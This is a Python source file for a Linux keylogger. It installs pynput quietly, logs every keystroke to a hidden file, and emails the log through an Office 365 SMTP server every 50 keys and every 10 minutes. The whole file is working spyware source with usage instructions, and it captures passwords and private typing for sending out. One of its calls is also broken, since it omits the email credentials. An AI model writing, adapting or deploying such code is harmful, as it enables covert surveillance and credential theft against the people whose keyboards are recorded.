"""
Auteur : Gwendoline Dossegger
Date   : 20.07.2022
Keylogger for Linux. It recovers all keystrokes and saves them to a hidden file in the executable directory.
Every 50 keystrokes and every 10 minutes, sends a copy of the logs by email.
The email account is passed as a parameter during execution.

-- Use --
python3 keylogger-smtp.py test@test.ch password
"""

#!/usr/bin/python
import sys
from subprocess import check_call

# Verify if pip is installed
try:
     import pip
     
except ImportError:
     print("Pip not present.")
     check_call(['apt-get', 'install', '-y', 'python3-pip'])
     
# Install the package pynput
check_call([sys.executable, '-m', 'pip', 'install','pynput'])

# Configuration of the keylogger
from pynput.keyboard import Listener
import logging

# Configuration of the mail
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from time import sleep

# Source : https://github.com/Sirius-Black4/keylogger
def send_mail(m, email, password):
    # put your gmail id, password, sender address over here
    email_user = email
    email_password = password

    # put any subject you like
    subject = 'Keylogger Linux - Logs'

    #fill in the body of the email
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_user
    msg['Subject'] = subject

    #put any body you like
    body = m
    msg.attach(MIMEText(body,'plain'))

    filename='.logs_linux.txt'
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.office365.com',587)
    server.starttls()
    server.login(email_user,email_password)

    server.sendmail(email_user,email_user,text)
    server.quit()


# Format of the log
logging.basicConfig(handlers=[logging.FileHandler(filename=".logs_linux.txt", encoding='utf-8')], level=logging.INFO, format=" %(asctime)s - %(message)s")

# Action when key is pressed
count = 0
EMAIL = sys.argv[1]
PASSWORD = sys.argv[2]
def on_press(key):
    global count
    count += 1
    if str(key) == '<65027>':
        logging.info("Key.altgr")
    else:
        logging.info(str(key))

    # Each 50 keys send keyboard logs by mail
    if count % 50 == 0:
        send_mail("each 50 keys",EMAIL,PASSWORD)

# Keyboard listening
listener = Listener(on_press=on_press)
listener.start()

# Each 10 minutes send keyboard logs by mail
while True:
    sleep(600)
    send_mail("each 10 min")
